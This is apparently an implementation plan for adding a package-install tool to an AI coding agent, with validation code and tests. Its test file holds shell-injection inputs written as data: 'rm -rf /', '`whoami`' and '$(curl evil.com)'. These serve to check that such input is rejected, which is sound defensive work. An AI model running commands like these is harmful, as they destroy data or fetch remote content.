# manage_packages Tool for DevAgent

> **For agentic workers:** REQUIRED: Use superpowers:subagent-driven-development (if subagents available) or superpowers:executing-plans to implement this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a `manage_packages` tool to DevAgent so the AI agent can install/remove npm packages inside its worktree.

**Architecture:** Add `managePackages()` function in `git-ops.ts` (shell command in worktree context), add tool definition to `DEV_TOOLS`, wire up in `executeTool` switch.

**Tech Stack:** Bun shell (`$`-tagged templates), regex validation

---

## Chunk 1: Implementation

### Task 1: Add `managePackages` function to git-ops.ts

**Files:**
- Modify: `src/services/dev-pipeline/git-ops.ts`

- [ ] **Step 1: Write the `managePackages` function**

Add at end of `git-ops.ts`:

```typescript
/** Validate package name to prevent shell injection */
const VALID_PACKAGE_RE = /^(@[\w.-]+\/)?[\w.-]+(@[\w.*^~<>=|-]+)?$/;

/** Install or remove packages in a worktree */
export async function managePackages(
  worktreePath: string,
  action: 'add' | 'remove',
  packages: string
): Promise<string> {
  const names = packages.split(/\s+/).filter(Boolean);
  if (names.length === 0) {
    throw new Error('No package names provided');
  }

  for (const name of names) {
    if (!VALID_PACKAGE_RE.test(name)) {
      throw new Error(`Invalid package name: ${name}`);
    }
  }

  const cmd = action === 'add'
    ? $`bun add ${names}`.cwd(worktreePath).timeout(60_000)
    : $`bun remove ${names}`.cwd(worktreePath).timeout(60_000);

  const result = await cmd.nothrow();
  const output = result.text();

  if (result.exitCode !== 0) {
    throw new Error(`bun ${action} failed (exit ${result.exitCode}): ${output}`);
  }

  console.log(`[GIT-OPS] bun ${action} ${names.join(' ')} — success`);
  return output || `${action === 'add' ? 'Installed' : 'Removed'}: ${names.join(', ')}`;
}
```

- [ ] **Step 2: Run type-check**

Run: `bunx tsc --noEmit`
Expected: PASS

- [ ] **Step 3: Commit**

```bash
git add src/services/dev-pipeline/git-ops.ts
git commit -m "feat(dev-pipeline): add managePackages function for worktree package management"
```

### Task 2: Add tool definition and wire up in DevAgent

**Files:**
- Modify: `src/services/dev-pipeline/dev-agent.ts`

- [ ] **Step 1: Add `manage_packages` to `DEV_TOOLS` array**

Add after the `commit` tool definition (before the closing `]`):

```typescript
  {
    name: 'manage_packages',
    description:
      'Install or remove npm packages in the project. Use this when your implementation requires a new dependency or when replacing one library with another.',
    input_schema: {
      type: 'object' as const,
      properties: {
        action: {
          type: 'string',
          enum: ['add', 'remove'],
          description: 'Whether to add or remove packages',
        },
        packages: {
          type: 'string',
          description:
            'Space-separated package names (e.g., "lodash zod" or "@types/lodash")',
        },
      },
      required: ['action', 'packages'],
    },
  },
```

- [ ] **Step 2: Add import for `managePackages`**

Update import from `./git-ops`:

```typescript
import { commitChanges, revertFileToMain, managePackages } from './git-ops';
```

- [ ] **Step 3: Add case in `executeTool` switch**

Add before the `default:` case:

```typescript
        case 'manage_packages': {
          const action = str('action');
          if (action !== 'add' && action !== 'remove') {
            return 'Error: action must be "add" or "remove"';
          }
          return await managePackages(this.worktreePath, action, str('packages'));
        }
```

- [ ] **Step 4: Run type-check**

Run: `bunx tsc --noEmit`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/services/dev-pipeline/dev-agent.ts
git commit -m "feat(dev-pipeline): add manage_packages tool to DevAgent"
```

### Task 3: Test package name validation

**Files:**
- Create: `src/services/dev-pipeline/git-ops.test.ts`

- [ ] **Step 1: Write validation tests**

```typescript
import { test, expect, describe } from 'bun:test';

// Import the regex directly — we'll test via managePackages rejecting bad names
import { managePackages } from './git-ops';

describe('managePackages validation', () => {
  test('rejects empty packages string', async () => {
    await expect(managePackages('/tmp', 'add', '')).rejects.toThrow(
      'No package names provided'
    );
  });

  test('rejects shell injection in package name', async () => {
    await expect(
      managePackages('/tmp', 'add', 'lodash; rm -rf /')
    ).rejects.toThrow('Invalid package name');
  });

  test('rejects backtick injection', async () => {
    await expect(
      managePackages('/tmp', 'add', '`whoami`')
    ).rejects.toThrow('Invalid package name');
  });

  test('rejects $() injection', async () => {
    await expect(
      managePackages('/tmp', 'add', '$(curl evil.com)')
    ).rejects.toThrow('Invalid package name');
  });

  test('accepts valid simple package name', async () => {
    // Will fail because /tmp is not a valid bun project, but should pass validation
    const result = managePackages('/tmp', 'add', 'lodash');
    await expect(result).rejects.toThrow(/bun add failed/);
  });

  test('accepts valid scoped package name', async () => {
    const result = managePackages('/tmp', 'add', '@types/lodash');
    await expect(result).rejects.toThrow(/bun add failed/);
  });

  test('accepts package with version specifier', async () => {
    const result = managePackages('/tmp', 'add', 'lodash@4.17.21');
    await expect(result).rejects.toThrow(/bun add failed/);
  });

  test('accepts multiple valid packages', async () => {
    const result = managePackages('/tmp', 'add', 'lodash zod');
    await expect(result).rejects.toThrow(/bun add failed/);
  });
});
```

- [ ] **Step 2: Run the tests**

Run: `bun test src/services/dev-pipeline/git-ops.test.ts`
Expected: All validation tests PASS (injection tests reject, valid names pass validation but fail on bun add since /tmp is not a project)

- [ ] **Step 3: Commit**

```bash
git add src/services/dev-pipeline/git-ops.test.ts
git commit -m "test(dev-pipeline): add validation tests for managePackages"
```
